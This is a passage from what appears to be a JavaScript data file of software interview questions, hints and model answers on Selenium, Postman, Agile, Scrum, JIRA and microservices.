      { q:'How do you handle dynamic web elements and complex user interactions in Selenium?', hint:'Dynamic IDs: use stable attributes (data-testid, aria-label). Wait for specific text/attribute. Actions class: hover, drag-drop, double-click. JavaScript executor. Frames: switchTo().frame(). Alerts. Multiple windows.', answer:`Dynamic elements change their locators between page loads - IDs like "button_12345" are generated and unreliable. Solutions: use data-testid attributes (agreed with the development team), aria-label, or CSS class selectors that are semantically meaningful. For elements loaded asynchronously, wait for a specific attribute value: until(attributeContains(element, "class", "loaded")). Complex interactions use the Actions class: new Actions(driver).moveToElement(menu).click(submenuItem).perform() chains hover and click; Actions for drag and drop: dragAndDrop(source, target). JavaScript execution handles scenarios where WebDriver clicks do not work: ((JavascriptExecutor)driver).executeScript("arguments[0].click();", element). Frame switching: driver.switchTo().frame(frameElement) for iframes, then driver.switchTo().defaultContent() to return. Alerts: driver.switchTo().alert().accept(). Multiple windows: driver.switchTo().window(handles.get(1)).` },
      { q:'What is Selenium Grid and how do you scale test execution?', hint:'Hub: receives requests, routes to nodes. Nodes: browser instances. Docker Compose setup. Selenium 4 Grid: fully distributed. Zalenium/Moon for dynamic scaling. Cross-browser + cross-OS. Parallel test suites.', answer:`Selenium Grid enables parallel distributed test execution across multiple machines and browsers. Architecture: the hub is the entry point - RemoteWebDriver connects to the hub URL. Nodes register with the hub, advertising their available browser types and versions. The hub routes incoming test requests to matching nodes. Selenium 4 introduced a fully distributed grid where each node can act as both hub and node, with a Router/Distributor/Session Map architecture that scales horizontally. Docker Compose makes local Grid setup straightforward: docker-compose up with selenium/hub and selenium/node-chrome/node-firefox containers. For cloud-based Grid, services like BrowserStack, Sauce Labs, and LambdaTest provide Grid-as-a-service with thousands of browser/OS combinations. I use Selenium Grid for: cross-browser testing (run the same suite on Chrome, Firefox, Edge simultaneously), reducing overall suite execution time through parallelisation, and testing on specific browser versions required by clients.` },
      { q:'How do you integrate Selenium with TestNG or JUnit 5 for test management?', hint:'TestNG: @BeforeMethod/@AfterMethod for driver setup/teardown. DataProvider for data-driven tests. ITestListener for logging. testng.xml for suite config. JUnit 5: @BeforeEach, @ParameterizedTest. Soft assertions. Test grouping.', answer:`TestNG is popular for Selenium because of its rich parallelisation and grouping features. Setup/teardown: @BeforeMethod creates a fresh WebDriver instance per test method; @AfterMethod quits the driver and takes a failure screenshot. ThreadLocal<WebDriver> stores the driver instance thread-safely for parallel execution - each thread has its own driver. @DataProvider enables data-driven tests: a method returns Object[][] of test data, and @Test(dataProvider="loginData") runs the test for each row. testng.xml configures parallel execution, groups, and suites. ITestListener intercepts test events for custom logging and Allure result attachment. JUnit 5 equivalent: @ExtendWith for lifecycle extensions, @ParameterizedTest with @CsvSource for data-driven tests. For soft assertions (collect all failures before failing the test): TestNG SoftAssert or AssertJ's SoftAssertions allows multiple verifications per test method without stopping at the first failure.` },
    ],
    postman: [
      { q:'How do you organise a Postman workspace for a large API project?', hint:'Workspaces: team vs personal. Collections: group by domain/service. Folders within collections. Environments: dev/staging/prod variables. Pre-request scripts and tests per folder. Description documentation.', answer:`Postman workspace organisation mirrors the API architecture. A team workspace is shared with all developers; personal workspaces are for individual experimentation. Collections group related API endpoints - I organise by domain or microservice (Users API, Orders API, Payments API). Within collections, folders group by resource type (Authentication, User Management, Profile) or by user workflow (Checkout Flow, Order Lifecycle). Environments store configuration variables per deployment stage: dev has baseUrl as http://localhost:3000, staging as https://staging.api.company.com, prod as https://api.company.com. Collection-level and folder-level pre-request scripts run before every request in that scope - common uses: generate timestamps, compute HMAC signatures. Tests at the folder level apply to all requests below, avoiding repetition. I add descriptions to collections and requests using Markdown - Postman can generate API documentation directly from these descriptions.` },
      { q:'How do you write Postman tests and what assertions are commonly used?', hint:'pm.test() with callback. pm.expect() using Chai assertions. pm.response: status, json(), responseTime, headers. pm.environment.set() to chain requests. pm.collectionVariables. Schema validation with Ajv.', answer:`Postman tests use JavaScript in the Tests tab. pm.test("Status is 200", () => { pm.expect(pm.response.code).to.equal(200); }). Common assertions: response status (pm.response.code), response body JSON (pm.response.json()), response time (pm.expect(pm.response.responseTime).to.be.below(500)), response headers (pm.response.headers.get('Content-Type')). Chaining requests: pm.environment.set('userId', pm.response.json().id) stores a value from one response for use in subsequent requests - essential for authentication flows where the login response token is used in subsequent requests. JSON schema validation with Ajv: const schema = { type: 'object', required: ['id', 'name'], properties: { id: { type: 'number' } } }; pm.expect(tv4.validate(pm.response.json(), schema)).to.be.true. I write tests at the collection runner level to run against all environments systematically.` },
      { q:'How do you use Postman for API authentication testing?', hint:'Pre-request script: programmatic auth. OAuth 2.0 flow in Postman. JWT: set Bearer token in headers. API keys: environment variable. Collection-level auth inherited by requests. Auto-refresh tokens.', answer:`Postman supports multiple auth patterns. Collection-level authentication sets an Authorization header for all requests in the collection - individual requests inherit or override it. For Bearer token auth, I store the token in an environment variable and set the Authorization header to Bearer {{token}}. For OAuth 2.0, Postman has a built-in flow under the Auth tab that handles the full code exchange, stores the access token, and auto-refreshes when expired. For programmatic token management, a collection pre-request script checks if the token is expired and re-requests it: if (Date.now() > pm.environment.get('tokenExpiry')) { pm.sendRequest(loginRequest, (err, response) => { pm.environment.set('token', response.json().accessToken); pm.environment.set('tokenExpiry', Date.now() + 3600000); }); }. API key authentication uses environment variables for the key value, preventing hardcoded credentials in exported collections that might be shared.` },
      { q:'What is Newman and how do you use it for automated API testing in CI/CD?', hint:'Newman: CLI runner for Postman collections. npm install -g newman. newman run collection.json -e environment.json. Reporters: CLI, HTML, JUnit XML. Exit codes for CI. --delay-request for rate limiting.', answer:`Newman is the Postman collection CLI runner that enables running collections in CI/CD pipelines without a GUI. Install with npm install -g newman and newman-reporter-htmlextra for rich HTML reports. Export the collection and environment from Postman (or use Postman API to fetch them programmatically). Run: newman run collection.json -e staging-environment.json --reporters cli,junit --reporter-junit-export results.xml. The JUnit XML reporter integrates with CI systems (Jenkins, GitHub Actions) for test result parsing and trend tracking. Exit code is non-zero if any test fails, so the CI pipeline fails appropriately. Newman parameters: --iteration-count for data-driven runs with CSV data files, --delay-request to add milliseconds between requests for rate-limited APIs, --timeout for request timeout, --bail to stop on first failure. In GitHub Actions, I run Newman after deploying to staging as a smoke test gate before promoting to production.` },
      { q:'How do you use Postman mock servers and how do they help development?', hint:'Mock server: simulate API before backend exists. Saved example responses. Endpoint matching. Frontend development without real backend. Contract testing. Postman cloud mock vs local.', answer:`Postman mock servers enable frontend development and testing against an API before the real backend is implemented. Create a mock server from a collection - Postman uses saved example responses for each request as the mock response. When the frontend sends a request matching the method and path, the mock returns the configured example. This decouples frontend and backend development: both teams work in parallel using the agreed API contract defined in the Postman collection. For development, mock server URL replaces the real backend URL in the development environment. Mock servers also support contract testing - the frontend tests are written against the mock, and if the real backend deviates from the contract, the mocks catch the divergence. Postman cloud mock servers are accessible publicly; for security-sensitive internal APIs, I use Postman local mock via Newman's --mock flag or deploy a WireMock service that replicates the Postman mock configuration.` },
      { q:'How do you use Postman for performance and load testing?', hint:'Collection Runner: iterate multiple times. Newman with --iteration-count. Postman does not replace JMeter/k6 for load testing. Monitor: scheduled runs. Pre-request scripts for timing.', answer:`Postman is primarily a functional API testing tool, not a load testing tool - it runs requests sequentially, not concurrently. For basic performance checks, I set assertions on response time: pm.expect(pm.response.responseTime).to.be.below(200). Postman Monitors run collections on a schedule (every 5 minutes) from multiple global regions, tracking response time trends and failing when APIs are slow or down - this is API monitoring, not load testing. The Collection Runner with iteration count re-runs requests multiple times, useful for measuring average response time but not concurrent load. For real load testing (concurrent users, ramp-up, sustained load), I use k6 (it can import Postman collections via a converter), JMeter, or Locust. The workflow: design and validate requests in Postman, then export or rewrite them in the load testing tool for performance testing. Postman and k6 integrate well in the same workflow since k6 scripts are JavaScript-based.` },
      { q:'How do you manage API documentation in Postman?', hint:'Collection descriptions: Markdown. Request descriptions with parameters, examples. Publish documentation: public/private. Version docs with collection versioning. API Builder for OpenAPI import. Auto-generated from collection.', answer:`Postman documentation is generated directly from collections, making it automatically up to date with the actual requests. I add Markdown descriptions to collections, folders, and individual requests - documenting purpose, required headers, parameter descriptions, and example use cases. Each request should have at least one saved example showing a successful response - these examples appear in documentation and drive mock servers. The Documentation tab previews rendered Markdown. Postman Publish Documentation creates a shareable URL - public for open APIs, or access-controlled for internal teams. Postman API Builder supports importing OpenAPI (Swagger) specifications to generate collections, and conversely, collections can be exported as OpenAPI specs. For developer portals, I embed the Postman documentation URL or export OpenAPI for tools like Swagger UI. Versioning: I include the API version in collection names and use collection versioning in Postman teams to maintain documentation for multiple API versions simultaneously.` },
    ],
    agile: [
      { q:'What is Agile and what are its core principles? How does it differ from Waterfall?', hint:'Agile Manifesto: individuals > processes, working software > docs, customer collaboration > contract, responding to change > plan. Iterations. Waterfall: sequential phases, late feedback. Agile: continuous feedback, adaptable.', answer:`The Agile Manifesto (2001) defined four values: individuals and interactions over processes and tools, working software over comprehensive documentation, customer collaboration over contract negotiation, and responding to change over following a plan. The 12 principles include delivering working software frequently (2-4 week iterations), welcoming changing requirements, and sustainable development pace. Waterfall sequences distinct phases (requirements > design > development > testing > deployment) with deliverables at each gate - late discovery of misunderstood requirements means expensive rework. Agile delivers working software in short iterations, incorporating stakeholder feedback after each increment. This reduces risk by validating assumptions early and enables course correction before large investments are made. Agile is not the absence of documentation or planning - it values these things but prioritises working software and collaboration when trade-offs arise.` },
      { q:'What are the most common Agile frameworks and how do you choose between them?', hint:'Scrum: sprints, ceremonies, roles. Kanban: continuous flow, WIP limits. SAFe: scaled enterprise. LeSS: scaled Scrum. XP: engineering practices. Choose based on team size, cadence needs, predictability requirements.', answer:`Scrum is the most widely adopted framework, providing structure through fixed-length sprints (1-4 weeks), defined roles (Product Owner, Scrum Master, Development Team), and ceremonies (Sprint Planning, Daily Scrum, Sprint Review, Retrospective). It suits teams building products with regular release cycles. Kanban focuses on continuous flow with visualised work (Kanban board), WIP limits to prevent overload, and no fixed iterations - it suits support/operations teams with unpredictable work arrival. Extreme Programming (XP) emphasises engineering practices: TDD, pair programming, continuous integration, refactoring - valuable for teams wanting to improve code quality alongside agile process. SAFe and LeSS scale Agile to large organisations with many teams working on one product. I choose Scrum for product teams needing planning cadence and predictability; Kanban for maintenance or support work; XP practices can overlay either framework to improve quality.` },
      { q:'How do you handle scope creep and changing requirements in Agile?', hint:'Product Backlog: single prioritised list. Sprint Backlog: committed work for current sprint. Change mid-sprint: discuss with PO, defer to next sprint unless critical. Sprint Goal protects focus. Capacity planning.', answer:`Agile embraces change but at the right time. The Product Backlog is the single source of truth for work - new requirements are added to the backlog and prioritised by the Product Owner based on value and effort, not squeezed into the current sprint arbitrarily. Once a Sprint starts, the Sprint Backlog is stable - the Sprint Goal defines the objective and the team protects the sprint from disruption. If truly urgent requests arrive mid-sprint, the Scrum Master facilitates a conversation: is this worth stopping the current sprint (rare and disruptive)? Can the team absorb it by descoping lower-priority items? Or does it wait for the next sprint (usually the answer)? I help teams distinguish between "urgent" and "important" - most new ideas that feel urgent can wait one sprint. Clear acceptance criteria and Definition of Done prevent scope from expanding within individual stories during development.` },
      { q:'How do you estimate work in Agile? Explain story points and planning poker.', hint:'Story points: relative complexity, not hours. Fibonacci sequence: 1,2,3,5,8,13,21. Planning Poker: consensus-based. Velocity: points completed per sprint. T-shirt sizing. #NoEstimates movement.', answer:`Story points measure relative effort, complexity, and uncertainty rather than absolute time - a 3-point story requires roughly three times the combined effort of a 1-point story. Teams calibrate their scale by selecting a reference story (a medium-complexity known task) and estimating relative to it. Planning Poker reaches consensus: everyone simultaneously reveals their estimate (using Fibonacci cards - the non-linear scale reflects increasing uncertainty at higher values). Divergent estimates spark conversation about misunderstood complexity. After calibration, velocity (story points completed per sprint) becomes a reliable forecasting tool - if a team completes 40 points per sprint, a 200-point backlog takes ~5 sprints. Velocity is a planning tool, not a performance metric - optimising for points (breaking stories smaller, inflating estimates) destroys its reliability. Some teams use T-shirt sizing (S/M/L/XL) for quick rough estimation. The #NoEstimates movement argues that forecasting from historical throughput without estimating individual items produces equally accurate forecasts with less overhead.` },
      { q:'What is the Definition of Done and why is it important?', hint:'DoD: team agreement on "complete". Quality standards: tested, reviewed, documented, deployed to staging. Prevents "almost done." Shared across team. Different from acceptance criteria. Sprint vs release DoD.', answer:`The Definition of Done is a shared agreement of what it means for a story or feature to be truly complete - not just coded but ready for release. A strong DoD might include: code written and reviewed (pull request approved), unit tests written and passing, integration tests passing, code deployed to staging environment, acceptance criteria verified by QA, documentation updated, accessibility checked, performance benchmarks met. Without an explicit DoD, "done" means different things to different team members - developers say code is done while QA says testing is not complete. The DoD prevents technical debt accumulation and ensures consistent quality. Acceptance criteria are story-specific (what this story must do); DoD is team-wide (how any story must be delivered). I facilitate a DoD discussion at sprint start and review it periodically in retrospectives - teams often start with a minimal DoD and strengthen it as quality practices mature.` },
      { q:'How do you run an effective Agile retrospective?', hint:'Safety: psychological safety for honest feedback. Formats: Start/Stop/Continue, 4Ls, Mad/Sad/Glad, Sailboat. Action items: owner and deadline. Follow up previous actions. Facilitate impartially. Time-box.', answer:`An effective retrospective requires psychological safety - team members speak honestly only if they trust feedback will not cause blame or retaliation. The Scrum Master facilitates impartially. Common formats: Start/Stop/Continue categorises what to add, remove, or maintain. The 4Ls (Liked, Learned, Lacked, Longed For) provides structured reflection. For teams exploring deeper issues, the Sailboat (wind/anchors/rocks/destination) maps what drives the team, what slows it, risks ahead, and the goal. Time-box to 90 minutes for a 2-week sprint. The retrospective fails if it produces no action items - or worse, the same items every sprint. Each action must have an owner and a target date, and the next retrospective checks whether previous actions were completed. I limit actions to 2-3 per retrospective so they are actually achievable. For remote teams, Miro, FunRetro, or EasyRetro provide collaborative digital boards.` },
      { q:'How do you measure Agile team health and delivery performance?', hint:'Velocity: trending. Cycle time: story started to done. Escaped defects: bugs reaching production. Sprint goal success rate. Team happiness/NPS. DORA metrics for engineering. Cumulative flow diagram.', answer:`Agile metrics should diagnose health, not create perverse incentives. Velocity (story points per sprint) is useful for planning when stable, but comparing velocities between teams or using it as a performance target destroys its value. Cycle time (time from starting a story to it being done) measures flow - high cycle time indicates bottlenecks. Cumulative flow diagrams visualise work flowing through stages; a widening WIP band indicates a stage bottleneck. Sprint goal success rate measures whether the team delivers its committed sprint objective - consistently failing goals indicates overcommitment or external disruption. Escaped defects (bugs reaching production) measure quality processes. For engineering performance, DORA metrics (deployment frequency, lead time, MTTR, change failure rate) are the industry standard. Team happiness through regular anonymous sentiment surveys (1-10 scales) catches morale issues before attrition occurs. I never use velocity to compare teams or pressure individuals - I use it to identify process improvement opportunities.` },
    ],
    scrum: [
      { q:'Explain the three Scrum roles and their responsibilities.', hint:'Product Owner: backlog, priorities, stakeholder bridge, accepts stories. Scrum Master: process facilitator, removes impediments, coaches, no authority over team. Development Team: cross-functional, self-organising, owns how work is done.', answer:`The Product Owner represents the business and is accountable for maximising the product value. Responsibilities: maintaining and prioritising the Product Backlog, writing clear user stories with acceptance criteria, being available to clarify requirements during the sprint, and accepting completed work at Sprint Review. The PO makes decisions about what to build, not the team. The Scrum Master serves the team and organisation by ensuring Scrum is understood and applied effectively. Responsibilities: facilitating Scrum ceremonies, removing impediments that block the team, coaching the team on Scrum practices, and shielding the team from external disruption. The Scrum Master has no authority over the team - they lead through influence and service. The Development Team is a cross-functional group with all skills needed to deliver a product increment. They are self-organising - they decide how to accomplish the Sprint Goal. Optimal size is 3-9 members; below 3 is too small for meaningful delivery; above 9 requires coordination overhead.` },
      { q:'Walk me through all Scrum ceremonies and their purpose and time-boxes.', hint:'Sprint Planning: 8h/4-week sprint, what and how. Daily Scrum: 15 min, sync. Sprint Review: 4h/4-week, demo and feedback. Retrospective: 3h/4-week, process improvement. Backlog Refinement: ongoing, 10% capacity.', answer:`Sprint Planning opens the sprint - the team selects Product Backlog items and creates the Sprint Backlog. Part 1: the Product Owner presents the top items and the team asks clarifying questions to select the Sprint Goal and which items to include. Part 2: the team decomposes selected items into tasks and estimates. Time-box: 8 hours for a 4-week sprint (proportionally shorter for shorter sprints). Daily Scrum is a 15-minute daily synchronisation - the team inspects progress toward the Sprint Goal and adjusts the plan. It is not a status report to the Scrum Master; it is for the team. Sprint Review is a 4-hour working session (4-week sprint) where the team demonstrates the increment to stakeholders, gathers feedback, and the Product Owner accepts or rejects stories. The backlog is updated based on feedback. Sprint Retrospective (3 hours, 4-week sprint) inspects the team process and creates improvement action items. Backlog Refinement is not an official Scrum ceremony but a practical necessity - 10% of sprint capacity spent reviewing and estimating upcoming backlog items.` },
      { q:'What is the Product Backlog and how should it be maintained?', hint:'Ordered list of everything needed in the product. INVEST criteria for stories. Epics broken into stories. Top is refined, bottom is rough. Single source of truth. Only PO can re-order. Refinement sessions.', answer:`The Product Backlog is an ordered list of everything that might be needed in the product - features, bug fixes, technical improvements, and research spikes. It is never complete; it evolves as the product and market evolve. The Product Owner orders it by value, risk, and dependencies - higher priority items are at the top, more detailed, and ready for sprint selection; lower items are rough and need future refinement. User stories should meet the INVEST criteria: Independent (can be developed and delivered separately), Negotiable (not a fixed contract), Valuable (delivers user value), Estimable (can be sized), Small (fits in a sprint), Testable (has clear acceptance criteria). Epics are large stories split into multiple user stories when they approach sprint readiness. Refinement sessions (attended by the PO, Scrum Master, and development team) sharpen upcoming items by adding detail, splitting large stories, and re-estimating. The goal: the top 2-3 sprints worth of stories are sprint-ready at all times.` },
      { q:'How do you handle impediments in Scrum?', hint:'Scrum Master removes impediments. Daily Scrum surfaces blockers. Impediment backlog: visible, tracked. Escalation path. Types: technical, organisational, dependency on other teams. Distinguish impediment from a task.', answer:`An impediment is anything that prevents the team from delivering the Sprint Goal - it is outside the team control and requires external action. The Daily Scrum is the primary forum for surfacing impediments: team members raise blockers so the Scrum Master can act. The Scrum Master maintains a visible impediment backlog (often a dedicated column on the Scrum board or JIRA) so impediments are tracked, not forgotten. Types: technical (infrastructure access, environment issues), organisational (policy blockers, budget approvals), or dependency (waiting on another team for an API). The Scrum Master resolves impediments by escalating to management, coordinating with other teams, or removing the bureaucratic obstacle. Impediments are distinct from tasks - if a developer cannot proceed on a story due to a technical challenge they can solve themselves, that is a task within the sprint; if they are blocked waiting for a decision from an external stakeholder, that is an impediment. Transparent impediment tracking also reveals systemic organisational dysfunction over time.` },
      { q:'How does Scrum handle technical debt?', hint:'Technical debt: shortcuts that slow future development. Not ignored in Scrum. Backlog items for debt. Definition of Done prevents accumulation. "Debt sprints" are anti-pattern. Reserve capacity. Refactoring within stories.', answer:`Scrum does not explicitly address technical debt, which is why it accumulates if teams are not intentional. The Definition of Done is the first defence - a strong DoD (code reviewed, tests written, refactored) prevents debt from accreting sprint by sprint. For existing debt, I advocate treating it as backlog items with business impact framed in terms the Product Owner can prioritise: "This authentication module debt increases the risk of security incidents and adds 2 hours to every new feature in this area." Dedicated "debt sprints" are an anti-pattern - they imply debt is separated from normal work, and Product Owners struggle to justify them against features. Better: the team reserves 10-20% of sprint capacity for debt reduction every sprint as part of sustainable pace. Refactoring that improves code supporting the current sprint goal should happen within sprint stories - boy scout rule: leave the code cleaner than you found it. The key is making debt visible to the Product Owner, not hiding it in technical backlog the business never sees.` },
      { q:'How do you scale Scrum across multiple teams working on the same product?', hint:'LeSS: up to 8 teams, shared sprint, single backlog, joint ceremonies. Scrum of Scrums: inter-team coordination meeting. Dependencies: managed in backlog. Feature teams vs component teams. Definition of Done applies to all teams.', answer:`Scaling Scrum introduces coordination challenges around shared backlog ownership, inter-team dependencies, and maintaining a potentially releasable increment from multiple teams. LeSS (Large-Scale Scrum) is the minimal scaling approach: one Product Owner, one Product Backlog, one Sprint across all teams (up to 8 teams), with teams selecting their own items from the shared backlog. Sprint ceremonies are mostly separate but Sprint Review is joint. Scrum of Scrums is a lightweight coordination meeting: one representative per team meets daily or every few days to surface cross-team impediments and dependencies. For dependencies, I make them explicit in the backlog with story links and plan dependent work in the same sprint (or the preceding sprint). Feature teams (each owns an end-to-end capability) reduce dependencies compared to component teams (each owns a technical layer), but require broader skill sets. A single Definition of Done applies across all teams - otherwise teams deliver at inconsistent quality levels, creating integration problems at release.` },
      { q:'What is a Sprint Goal and why does it matter?', hint:'Sprint Goal: single objective for the sprint. Focus and coherence. Guides decisions mid-sprint. Scope flexibility within Sprint Goal. Not a list of stories. Team commitment. Sprint Goal success rate as health metric.', answer:`The Sprint Goal is a single, short objective that the sprint is designed to achieve - it provides focus and coherence to the collection of selected backlog items. A good Sprint Goal is outcome-based: "Enable customers to complete checkout without assistance" not "implement 7 stories from the backlog." The Sprint Goal matters for several reasons: it guides mid-sprint decisions when unexpected issues arise - the team asks "does this help us achieve the Sprint Goal?" to decide how to adjust. It creates commitment and a sense of shared purpose beyond a task list. It provides scope flexibility - if one story in the sprint blocks the goal, the team can descope lower-value stories to protect the goal. Sprint Goal success rate (percentage of sprints where the goal is fully achieved) is a key health metric - consistently below 80% indicates overcommitment or external disruption. I work with Product Owners to craft meaningful Sprint Goals before Sprint Planning, not after stories are selected.` },
    ],
    jira: [
      { q:'How do you structure a JIRA project for a software development team?', hint:'Project types: Scrum board vs Kanban. Epic > Story > Subtask hierarchy. Custom fields for team needs. Workflow states aligned to Definition of Done. Sprints for Scrum projects. Labels and components for filtering.', answer:`JIRA project setup decisions impact team workflows for months. Project type: Scrum project for teams with fixed sprints; Kanban project for teams with continuous flow (support, ops). Issue hierarchy: Epics represent large features spanning multiple sprints (e.g., "User Authentication System"); Stories are user-facing increments completable within a sprint following INVEST criteria; Subtasks break stories into technical tasks within a sprint. Custom fields: I add fields matching how the team works - Story Points (required for velocity tracking), Sprint (automatic in Scrum projects), Components (service areas), Fix Version (release tracking), and Priority. Workflow states must match the team DoD: To Do > In Progress > In Review > In QA > Done (with done meaning deployed to staging and tested, not just coded). Labels add searchable categories; Components group work by technical area or team ownership. I avoid over-customising early - start minimal and add fields when the team identifies a genuine need.` },
      { q:'How do you write effective JIRA tickets (user stories, bugs, tasks)?', hint:'User story: As a [role] I want [goal] so that [reason]. Acceptance criteria: Given/When/Then or checklist. Bug: steps to reproduce, expected vs actual, environment, severity. Tasks: clear deliverable. INVEST criteria.', answer:`Effective JIRA tickets follow specific formats by type. User stories use "As a [role], I want [feature], so that [value]" to capture who, what, and why. Acceptance criteria use Given/When/Then (BDD format) or a checklist: "Given user is logged out, When they access a protected page, Then they are redirected to login with a return URL parameter." Every story needs testable acceptance criteria - "works correctly" is not testable. Bug reports require: steps to reproduce (numbered, precise), expected behaviour, actual behaviour, environment (browser, OS, app version), severity/priority, and supporting evidence (screenshots, logs, network traces). A reproducible bug report reduces back-and-forth and speeds resolution. Tasks (technical work without direct user value) describe a concrete deliverable: "Set up Redis Cluster for session storage in AWS ECS - include Terraform config and monitoring alerts." I avoid vague task descriptions like "work on authentication."` },
      { q:'How do you use JIRA to track sprint progress and team velocity?', hint:'Sprint board: columns matching workflow. Burndown chart: tracking remaining work. Velocity chart: historical sprints. Reports: Sprint Report, Velocity Chart, Cumulative Flow Diagram. Board filters. Story Points sum.', answer:`Sprint progress tracking in JIRA uses several built-in reports. The Sprint board provides a real-time view of story states across workflow columns - I watch for stories stuck in one column for multiple days, which surfaces bottlenecks. The Burndown Chart plots remaining story points over the sprint duration - an ideal burndown is linear; real burndowns show patterns: flat early (stories not being started), steep drops (large stories completing late), or incomplete sprints (scope added mid-sprint). The Velocity Chart shows story points completed per sprint for the last several sprints - used for forecasting future sprint capacity. Sprint Reports summarise completed, incomplete, and added stories with rationale. Daily standups should reference the JIRA board - "What moved yesterday? What will move today? What is blocked?" For team-level metrics, I create a saved filter for "stories completed this sprint by assignee" to identify where the team distribution is uneven and whether pairing might help.` },
      { q:'How do you manage JIRA for multiple teams or a large project?', hint:'Multiple boards: one per team. Shared backlog with Components filter. Epics span teams via Portfolio/Advanced Roadmaps. Cross-team dependencies: link types. Program increment planning. Filters and dashboards for visibility.', answer:`Large projects with multiple teams require cross-team visibility without losing team-level clarity. Each team has its own Scrum board showing only their assigned stories - filtered by Component or Label (team name). A shared Product Backlog across all teams allows the Product Owner to prioritise work globally; teams filter the backlog to their component area. Epics span multiple teams and sprints - Advanced Roadmaps (formerly Portfolio for JIRA) provides a timeline view of Epic delivery across teams, highlighting dependencies and scheduling conflicts. Cross-team dependencies: use JIRA link types ("is blocked by", "blocks") to make dependencies explicit and visible on both teams boards. Program Increment planning (from SAFe) runs quarterly planning sessions where all teams plan their next 4-6 sprints together, identifying and resolving cross-team dependencies upfront. JIRA dashboards aggregate metrics across projects: a program-level dashboard shows velocity, sprint completion, and impediment counts per team, visible to stakeholders and management.` },
      { q:'How do you integrate JIRA with development tools like GitHub or Bitbucket?', hint:'Smart commits: commit message references JIRA key (PROJECT-123). Branch naming convention: feature/PROJECT-123-description. Automation: transition story on PR merge. Deployment tracking. Development panel in JIRA issue.', answer:`JIRA integrates with Git platforms to connect code changes to tickets. The JIRA Development Panel in each issue shows linked branches, commits, and pull requests when the Git integration (GitHub for JIRA, Bitbucket, GitLab) is configured. Smart commits in commit messages: "PROJECT-123 #comment Added payment validation" transitions the story and adds a comment; "PROJECT-123 #done" moves the story to Done. Branching conventions: feature/PROJECT-123-add-payment-gateway makes the connection explicit and enables automation. JIRA Automation triggers: "When PR is merged to main, transition linked story to In QA" removes manual state transitions. Deployment information: connecting to deployment tools (GitHub Actions, Bitbucket Pipelines) shows deployment status per story - "Deployed to Staging" or "Deployed to Production." This gives the Product Owner visibility into where each story is in the release pipeline without asking developers. For release management, JIRA Releases (Fix Version) group stories for a release and track delivery progress.` },
      { q:'How do you use JIRA Automation to reduce manual work?', hint:'Triggers: issue created, status change, comment, schedule. Conditions: JQL matching. Actions: transition, assign, comment, create subtask, notify, update field. Common automations: auto-assign, stale ticket alerts, sprint end cleanup.', answer:`JIRA Automation uses a trigger-condition-action model. Trigger: "When an issue is created" / "When status changes to In Review" / "Scheduled: every Monday at 9 AM." Condition: JQL filter narrows which issues the rule applies to. Action: transition issue, assign to user, send notification, create subtask, update a field, or post a comment. Practical automations I implement: auto-assign stories to the reporter when they transition to QA (eliminating manual handoff); stale ticket alerts - when a story has been In Progress for more than 3 days without an update, comment and notify the assignee; sprint end cleanup - when a sprint ends, move uncompleted stories to the next sprint automatically and notify the PO; auto-create subtasks for standard tasks (code review subtask when story moves to In Review). Automation rules should have clear naming (for maintainability) and audit logs are built-in. I review automation rules quarterly to remove ones that no longer match team workflow.` },
      { q:'How do you create and use JIRA dashboards and reports for stakeholders?', hint:'Dashboards: add gadgets. Gadgets: Sprint Burndown, Velocity, Two-Dimensional Filter Statistics, Pie Chart by status. JQL for custom filters. Sharing: team vs organisation. Executive view vs team view.', answer:`JIRA dashboards aggregate information across projects for specific audiences. For executive stakeholders, a release dashboard shows: Epic completion percentage via a Pie Chart (Epics by status), upcoming sprint completion via Sprint Report gadget, open critical bugs via a filter statistics gadget, and deployment frequency via a Two-Dimensional Filter Statistics gadget (stories by Fix Version and environment). For team leads, a team health dashboard shows: velocity trend, sprint burndown, blocked issues count, stories in QA more than 2 days (stale QA work). For the Product Owner, a backlog health dashboard shows: unestimated stories count, stories without acceptance criteria (requires a custom field), and upcoming sprint readiness. JQL-based filter gadgets are the most flexible - any query can become a gadget. I keep dashboards focused on decisions the viewer needs to make: an executive dashboard that shows everything is as useful as one showing nothing. Dashboard sharing: team-scoped for internal metrics, read-only links for stakeholders outside JIRA.` },
    ],
    microservices: [
      { q:'What are microservices and when should you use them instead of a monolith?', hint:'Microservices: independently deployable services around business capabilities. Benefits: independent scaling, tech flexibility, team autonomy. Costs: distributed systems complexity. Start monolith first (majestic monolith). Conway Law.', answer:`Microservices decompose an application into independently deployable services, each owning a bounded domain context and its own data store. Benefits: teams deploy their service independently without coordinating with other teams, services can scale independently based on demand (the checkout service scales during peak shopping, not the entire application), and services can use different technologies best suited to their purpose. The costs are significant: distributed systems introduce network failures, latency, and partial failure modes that monoliths avoid. Service discovery, distributed tracing, inter-service authentication, eventual consistency, and distributed transactions all require additional infrastructure and complexity. Conway's Law says system architecture mirrors the communication structure of the organisation that built it - microservices architecture only works well when the team structure supports it (small, autonomous teams owning individual services). My advice: start with a well-structured monolith (the "Majestic Monolith"), and extract services when you have clear domain boundaries, independent scaling needs, or genuine team autonomy requirements - not prematurely.` },
      { q:'How do microservices communicate? Compare synchronous and asynchronous patterns.', hint:'Sync: REST/gRPC (request-response). Async: message queue (Kafka, RabbitMQ). Sync: simpler but tight coupling, cascading failures. Async: decoupled, resilient, eventual consistency. Saga pattern for distributed transactions.', answer:`Synchronous communication (REST, gRPC) uses request-response: Service A calls Service B and waits for a response. Simple to understand and implement, but creates temporal coupling - Service B must be available when Service A needs it, and slow Service B responses cascade to Service A. gRPC uses Protocol Buffers for efficient binary serialisation and supports streaming - better for high-throughput internal APIs than REST. Asynchronous communication via message queues (Kafka, RabbitMQ, AWS SQS) decouples services: Service A publishes an event and continues without waiting; Service B consumes the event when ready. This eliminates temporal coupling and provides resilience - if Service B is down, events queue up and process when it recovers. The trade-off is eventual consistency - state propagates asynchronously. For distributed transactions, the Saga pattern coordinates multi-step workflows: either choreography (services react to events from each other) or orchestration (a central coordinator issues commands). I use synchronous calls for real-time user-facing queries and asynchronous events for state changes and workflows.` },
